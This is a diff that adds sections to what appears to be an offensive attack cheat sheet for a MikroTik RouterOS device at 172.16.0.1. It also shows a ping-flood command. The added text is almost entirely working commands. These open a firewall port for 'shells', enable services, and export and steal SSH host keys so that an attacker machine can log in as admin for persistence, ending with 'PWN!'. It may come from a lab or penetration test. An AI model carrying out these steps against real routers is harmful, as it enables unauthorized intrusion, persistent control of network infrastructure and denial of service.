@@ -292,4 +292,39 @@ Target: `http://172.16.0.1:55511`
     * **9.1 Execution**
         - `tool ping-flood count=1000 size=1492 address=172.16.0.x`
 
+* **10. Firewall Rules & Bypassing** Allowing for external operations, port tunneling, and shells.
+    * **10.1 Displaying The Current Rules**
+        - `ip firewall filter print`
+    * **10.2 Create A TCP Filter Rule**
+        - `ip firewall filter add chain=input action=accept protocol=tcp dst-port=61337`
+    
+* **11. Interface Service Binding** routerOS comes with telnet and ssh services by default.
+    * **11.1 Listing All Services**
+        - `ip service print`
+    * **11.2 Targeted Service Listing**
+        - `ip service print where chain=input`
+    * **11.3 Setting A Service**
+        - `ip service enable <service>` or `ip service enable ssh`, however the service refuses to spawn due to inability to `system reboot`.
+
+* **12. SSH Persistence**
+    * **12.1 Leak Any Existing Keys**
+        - `ip ssh print`
+    * **12.2 Export Any Existing Keys**
+        - `ip ssh export`
+        - Use further methods to extract any keys.
+        > NOTE: If proven futile, identify the model from the extracted information and use OSINT.
+    * **12.3 Regenerating The 'Host Key'**
+        - `ip ssh regenerate-host-key` _NOTE: Took a couple a tries to get the CLI to work._
+        - `ip ssh export-host-key` _NOTE: Also took some time, often hung for a while._
+    * **12.4 Validate Export & Fetch**
+        - `file print`
+        - _NOTE: Use the methods above for exportation techniques._
+        - `file print detail` to directly copy-paste the operation.
+    * **12.5 Post fetch**
+        - On the `attacker machine` execute `sudo chown 777 ssh_host_private_key(.pub)`.
+        - Copy-Paste or `cat ../ssh_host_private_key.pub` into `~/.ssh/authorized_keys`.
+        - Attempt the ssh `ssh admin@172.16.0.1 -i ../ssh_host_private_key`
+        - PWN!
+        > NOTE: Not only does it give the central key, but it also generates the `dsa`, `admin` and the `ssh_host_private_key`.
+    
     
